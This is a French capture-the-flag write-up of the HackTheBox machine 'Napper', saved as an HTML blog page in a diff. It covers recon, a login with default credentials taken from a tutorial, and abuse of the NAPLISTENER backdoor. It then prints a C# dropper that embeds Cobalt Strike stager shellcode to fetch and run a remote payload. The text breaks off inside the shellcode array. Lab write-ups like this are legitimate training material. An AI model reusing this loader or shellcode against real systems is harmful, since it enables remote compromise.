@@ -1,0 +1,1242 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta
+    name="description"
+    content="Author: Kien Nguyen <kiennt2609@gmail.com>
+      A minimal Hugo theme with Tailwind CSS"
+  />
+  <title>
+    
+      Blog de TaylorDeDordogne
+      | Windows Box : Napper
+    
+  </title>
+  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
+  <meta name="description" content="" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <link
+    rel="icon"
+    href="/favicon_io/favicon.ico"
+    type="image/x-icon"
+  />
+  <link
+    rel="icon"
+    href="/favicon_io/favicon-16x16.png"
+    size="16x16"
+    type="image/png"
+  />
+  <link
+    rel="icon"
+    href="/favicon_io/favicon-32x32.png"
+    size="32x32"
+    type="image/png"
+  />
+
+  <link
+    rel="preload"
+    type="text/css"
+    href="/css/rose-pine.min.css"
+    integrity=""
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/rose-pine.min.css"
+      integrity=""
+    />
+  </noscript><link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  href="https://fonts.googleapis.com/css2?family=Overpass+Mono:wght@400;500;700&family=Overpass:wght@400;500;700&display=swap"
+  rel="stylesheet"
+/>
+<link
+    rel="preload"
+    type="text/css"
+    href="/css/toigian.css"
+    integrity=""
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/toigian.css"
+      integrity=""
+    />
+  </noscript>
+
+  
+  <link
+    rel="stylesheet"
+    type="text/css"
+    href="/css/light.css"
+    integrity=""
+  />
+  <link
+    rel="stylesheet"
+    type="text/css"
+    href="/css/dark.css"
+    integrity=""
+  />
+
+  <script>
+    
+    if (
+      localStorage.theme === "dark" ||
+      (!("theme" in localStorage) &&
+        window.matchMedia("(prefers-color-scheme: dark)").matches)
+    ) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+  </script>
+
+  
+  
+  <script
+    async
+    defer
+    src="/js/main.js"
+    integrity=""
+  ></script>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+  <script>
+    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
+  </script>
+  
+  
+</head>
+<body><header style="--layer: 10">
+  <div
+    aria-hidden="true"
+    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
+  ></div>
+
+  <div
+    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
+  ><div
+  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
+>
+  <nav>
+    <ol class="flex text-md items-center">
+      
+  
+    
+  
+    
+  
+  
+  
+  <li>
+    
+    
+    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
+  
+
+  
+  
+  
+  <li>
+    
+    
+    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write Ups</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
+  
+
+  
+  
+  
+    
+  
+  <li>
+    
+    
+    <a href="/write-ups/htb-napper/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Windows Box : Napper</a>
+  </li>
+  
+
+    </ol>
+  </nav>
+  <nav>
+    <a href="http://localhost:1313//index.xml"
+      ><svg
+        width="18px"
+        height="18px"
+        xmlns="http://www.w3.org/2000/svg"
+        fill="none"
+        viewBox="0 0 24 24"
+        stroke-width="1.5"
+        stroke="currentColor"
+      >
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
+        />
+      </svg>
+    </a>
+  </nav>
+</div>
+
+
+</div>
+</header>
+<main class="flex justify-center px-page-gutter py-page-top">
+      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
+  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
+>
+  <nav>
+    <ol class="flex text-md items-center">
+      
+  
+    
+  
+    
+  
+  
+  
+  <li>
+    
+    
+    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
+  
+
+  
+  
+  
+  <li>
+    
+    
+    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write Ups</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
+  
+
+  
+  
+  
+    
+  
+  <li>
+    
+    
+    <a href="/write-ups/htb-napper/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Windows Box : Napper</a>
+  </li>
+  
+
+    </ol>
+  </nav>
+  <nav>
+    <a href="http://localhost:1313//index.xml"
+      ><svg
+        width="18px"
+        height="18px"
+        xmlns="http://www.w3.org/2000/svg"
+        fill="none"
+        viewBox="0 0 24 24"
+        stroke-width="1.5"
+        stroke="currentColor"
+      >
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
+        />
+      </svg>
+    </a>
+  </nav>
+</div>
+
+
+<article>
+  <h1>Windows Box : Napper</h1>
+  <time class="text-sm italic tabular-nums text-muted"
+  >2024/01/07&nbsp;</time
+>
+
+  
+
+  
+    <div class="section">
+      
+        
+        <a href="/tags/pentest/" id="tag">Pentest</a>
+      
+        
+        <a href="/tags/hackthebox/" id="tag">HackTheBox</a>
+      
+    </div>
+  
+
+
+<div id="toc">
+  
+    
+      <details open>
+        <summary>Table of contents</summary>
+        <div id="toc-list"><nav id="TableOfContents">
+  <ol>
+    <li><a href="#analyse-de-la-fonction-mainmain">Analyse de la fonction main.main</a></li>
+    <li><a href="#analyse-de-la-fonction-mainrandstringlist">Analyse de la fonction main.randStringList</a></li>
+    <li><a href="#analyse-de-la-fonction-maingenkey">Analyse de la fonction main.genKey</a></li>
+    <li><a href="#suite-de-la-fonction-mainmain">Suite de la fonction main.main</a></li>
+    <li><a href="#résumé-de-la-rétro-ingéniérie">Résumé de la rétro-ingéniérie</a></li>
+  </ol>
+</nav></div>
+      </details>
+    
+  
+</div>
+<div class="content"><h1 id="introduction">Introduction</h1>
+<p>Cette box windows avait la particularité de ne pas reposer sur de l&rsquo;exploitation d&rsquo;Active Directory comme c&rsquo;est souvent le cas sur HackTheBox. Même si la première partie pour flag l&rsquo;user était assez peu technique, la privesc reposait sur du Reverse Engineering d&rsquo;un binaire codé en Go. Donc j&rsquo;ai décidé d&rsquo;en faire un Write Up! On commence par un scan nmap comme d&rsquo;hab!</p>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>Comme précisé dans l&rsquo;intro, la machine à attaquer ne fait pas partie d&rsquo;un domaine, on n&rsquo;a donc pas les ports spécifiques à un controlleur de domaine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">nmap -sC -sV -p- 10.10.11.240   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-06 18:51 EST
+</span></span><span class="line"><span class="cl">Nmap scan report for app.napper.htb (10.10.11.240)
+</span></span><span class="line"><span class="cl">Host is up (0.026s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65533 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">80/tcp  open  http     Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to https://app.napper.htb
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">|_http-generator: Hugo 0.112.3
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">|_ssl-date: 2024-01-06T23:53:44+00:00; +2s from scanner time.
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: DNS:app.napper.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2023-06-07T14:58:55
+</span></span><span class="line"><span class="cl">|_Not valid after:  2033-06-04T14:58:55
+</span></span><span class="line"><span class="cl">| tls-alpn: 
+</span></span><span class="line"><span class="cl">|_  http/1.1
+</span></span><span class="line"><span class="cl">|_http-title: Research Blog | Home 
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">|_clock-skew: 1s
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 157.02 seconds
+</span></span></code></pre></div><p>On a donc juste un serveur <code>Internet Information Services</code> qui tourne sur le port 443 / 80 et et qui héberge entre autre le sous-domaine <code>app.napper.htb</code>. Après avoir ajouté le nom de domaine dans notre fichier <code>/etc/hosts</code> voilà à quoi ressemble le site web hébergé:</p>
+<div>
+    <img src="assets/blog.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<h1 id="enumeration">Enumeration</h1>
+<p>Ca ressemble à un blog de hacking classique avec un thème hugo, on va tenter deux énumérations: Une sur les chemins d&rsquo;accès du site et l&rsquo;autre sur les sous-domaines. Pour l&rsquo;énumération des sous-domaines avec gobuster, il faut bien passer par l&rsquo;option <code>vhost</code> qui va injecter dans l&rsquo;en-tête <code>Host</code> et pas par l&rsquo;option <code>dns</code> qui elle va se baser sur des requêtes DNS. De plus sur les version récentes, bien penser à mettre l&rsquo;option <code>--append-domain</code> lorsque l&rsquo;on teste avec le domaine de base.</p>
+<p>Pour l&rsquo;énumération des chemins d&rsquo;accès, on a pas grand chose de pertinet:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">gobuster dir -u https://napper.htb -k -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:                     https://napper.htb
+</span></span><span class="line"><span class="cl">[+] Method:                  GET
+</span></span><span class="line"><span class="cl">[+] Threads:                 10
+</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
+</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
+</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/js                   (Status: 301) [Size: 145] [--&gt; https://napper.htb/js/]
+</span></span><span class="line"><span class="cl">/css                  (Status: 301) [Size: 146] [--&gt; https://napper.htb/css/]
+</span></span><span class="line"><span class="cl">/page                 (Status: 301) [Size: 147] [--&gt; https://napper.htb/page/]
+</span></span><span class="line"><span class="cl">/tags                 (Status: 301) [Size: 147] [--&gt; https://napper.htb/tags/]
+</span></span><span class="line"><span class="cl">/.                    (Status: 200) [Size: 5602]
+</span></span><span class="line"><span class="cl">/fonts                (Status: 301) [Size: 148] [--&gt; https://napper.htb/fonts/]
+</span></span><span class="line"><span class="cl">/CSS                  (Status: 301) [Size: 146] [--&gt; https://napper.htb/CSS/]
+</span></span><span class="line"><span class="cl">/categories           (Status: 301) [Size: 153] [--&gt; https://napper.htb/categories/]
+</span></span></code></pre></div><p>En revanche pour l&rsquo;énumération des sous-domaines on a quelque chose de plus concluant!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">gobuster vhost -u https://napper.htb -k -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:             https://napper.htb
+</span></span><span class="line"><span class="cl">[+] Method:          GET
+</span></span><span class="line"><span class="cl">[+] Threads:         10
+</span></span><span class="line"><span class="cl">[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class="line"><span class="cl">[+] User Agent:      gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Timeout:         10s
+</span></span><span class="line"><span class="cl">[+] Append Domain:   true
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in VHOST enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Found: internal.napper.htb Status: 401 [Size: 1293]
+</span></span></code></pre></div><p>Après avoir ajouté le sous domaine au fichier hosts, on est vite stoppé par une demande d&rsquo;authentification et après avoir testé les méthodes classiques de confusions de méthodes, on peut se décider à aller chercher dans le contenu du blog en quête d&rsquo;indices:</p>
+<div>
+    <img src="assets/posts.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>L&rsquo;article qui attire naturellement l&rsquo;attention c&rsquo;est celui qui traite de la mise en place de la <code>Basic Authentication</code> sur un IIS avec Powershell:</p>
+<div>
+    <img src="assets/auth.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Ici le tutoriel suivi utilise une <code>Secure-String</code> basée sur un mot de passe en clair, on peut donc tester les identifiants: <code>example</code> / <code>ExamplePassword</code> au cas où le propriétaire du blog aurait simplement copié collé le contenu du tutoriel, et Bingo!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl -k https://internal.napper.htb -u example:ExamplePassword -I     
+</span></span><span class="line"><span class="cl">HTTP/2 200 
+</span></span><span class="line"><span class="cl">content-length: 4115
+</span></span><span class="line"><span class="cl">content-type: text/html
+</span></span><span class="line"><span class="cl">last-modified: Thu, 08 Jun 2023 11:54:48 GMT
+</span></span><span class="line"><span class="cl">accept-ranges: bytes
+</span></span><span class="line"><span class="cl">etag: &#34;21184609ad91:0&#34;
+</span></span><span class="line"><span class="cl">server: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">date: Sun, 07 Jan 2024 00:13:09 GMT
+</span></span></code></pre></div><p>On a maintenant accès au sous domaine interne du site avec un article en plus:</p>
+<div>
+    <img src="assets/internal.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<h1 id="accès">Accès</h1>
+<p>Hmm il est question d&rsquo;une backdoor nommée <code>NAPLISTENER</code> (qui existe vraiment, il y&rsquo;a de la doc à son sujet <a href="https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph">ici</a>). Cette backdoor serait donc testée actuellement par l&rsquo;équipe d&rsquo;analyse de malware sur la machine, il va nous falloir trouver un moyen d&rsquo;y avoir accès. En se renseignant un peu on découvre que la backdoor est censée exécuté un assembly .NET encodé en Base64 et passé à l&rsquo;endpoint <code>/ews/MsExgHealthCheckd/</code> dans le paramètre <code>sdafwe3rwe23</code>. Pour vérifier que le serveur IIS est bien infecté par la backdoor on peut remarquer la présence d&rsquo;un en-tête <code>server</code> supplémentaire renvoyé lorsque l&rsquo;on accède à l&rsquo;endpoint utilisé par la backdoor:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">curl -k https://10.10.11.240/ews/MsExgHealthCheckd/:443 -I
+</span></span><span class="line"><span class="cl">HTTP/2 404 
+</span></span><span class="line"><span class="cl">content-length: 0
+</span></span><span class="line"><span class="cl">content-type: text/html; charset=utf-8
+</span></span><span class="line"><span class="cl">server: Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">x-powered-by: ASP.NET
+</span></span><span class="line"><span class="cl">date: Sun, 07 Jan 2024 00:30:59 GMT
+</span></span></code></pre></div><p>l&rsquo;en tête <code>Microsoft-HTTPAPI/2.0</code> correspond à l&rsquo;espace de noms .NET <code>System.Net</code> qui définit la classe <code>HttpListener</code> utilisée par la backdoor.
+Pour construire mon payload je vais utiliser un <code>stager Cobalt Strike</code>, l&rsquo;assembly se chargera de l&rsquo;injecter en mémoire en utilisant une méthode classique (on est sur HackTheBox, vu le niveau de difficulté de la box, l&rsquo;AV n&rsquo;est probablement pas activé).</p>
+<p>Pour compiler l&rsquo;assembly on va utiliser Visual Studio et Créer un nouveau projet C# de type <code>Bibliothèque de classes</code>. Voilà le code du programme qui va charger notre stager dans la mémoire non managée:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cs" data-lang="cs"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">DropperMeterpreter</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="k">class</span> <span class="nc">Globals</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">shellcode</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">797</span><span class="p">]</span> <span class="p">{</span> <span class="m">0xfc</span><span class="p">,</span> <span class="m">0xe8</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x60</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xe5</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xd2</span><span class="p">,</span> <span class="m">0x64</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x0c</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x14</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x72</span><span class="p">,</span> <span class="m">0x28</span><span class="p">,</span> <span class="m">0x0f</span><span class="p">,</span> <span class="m">0xb7</span><span class="p">,</span> <span class="m">0x4a</span><span class="p">,</span> <span class="m">0x26</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0xac</span><span class="p">,</span> <span class="m">0x3c</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x7c</span><span class="p">,</span> <span class="m">0x02</span><span class="p">,</span> <span class="m">0x2c</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0xc1</span><span class="p">,</span> <span class="m">0xcf</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xc7</span><span class="p">,</span> <span class="m">0xe2</span><span class="p">,</span> <span class="m">0xf0</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x10</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x42</span><span class="p">,</span> <span class="m">0x3c</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd0</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="m">0x78</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x4a</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd0</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x18</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd3</span><span class="p">,</span> <span class="m">0xe3</span><span class="p">,</span> <span class="m">0x3c</span><span class="p">,</span> <span class="m">0x49</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd6</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0xac</span><span class="p">,</span> <span class="m">0xc1</span><span class="p">,</span> <span class="m">0xcf</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xc7</span><span class="p">,</span> <span class="m">0x38</span><span class="p">,</span> <span class="m">0xe0</span><span class="p">,</span> <span class="m">0x75</span><span class="p">,</span> <span class="m">0xf4</span><span class="p">,</span> <span class="m">0x03</span><span class="p">,</span> <span class="m">0x7d</span><span class="p">,</span> <span class="m">0xf8</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0x7d</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x75</span><span class="p">,</span> <span class="m">0xe2</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd3</span><span class="p">,</span> <span class="m">0x66</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x0c</span><span class="p">,</span> <span class="m">0x4b</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0x1c</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd3</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x04</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd0</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0x44</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x5b</span><span class="p">,</span> <span class="m">0x5b</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x59</span><span class="p">,</span> <span class="m">0x5a</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xe0</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0x5f</span><span class="p">,</span> <span class="m">0x5a</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x12</span><span class="p">,</span> <span class="m">0xeb</span><span class="p">,</span> <span class="m">0x86</span><span class="p">,</span> <span class="m">0x5d</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x77</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x4c</span><span class="p">,</span> <span class="m">0x77</span><span class="p">,</span> <span class="m">0x26</span><span class="p">,</span> <span class="m">0x07</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x3a</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x79</span><span class="p">,</span> <span class="m">0xa7</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0xe9</span><span class="p">,</span> <span class="m">0x84</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x5b</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xc9</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x6a</span><span class="p">,</span> <span class="m">0x03</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0x9f</span><span class="p">,</span> <span class="m">0xc6</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0xeb</span><span class="p">,</span> <span class="m">0x70</span><span class="p">,</span> <span class="m">0x5b</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xd2</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x02</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="m">0x84</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0xeb</span><span class="p">,</span> <span class="m">0x55</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xc6</span><span class="p">,</span> <span class="m">0x83</span><span class="p">,</span> <span class="m">0xc3</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span 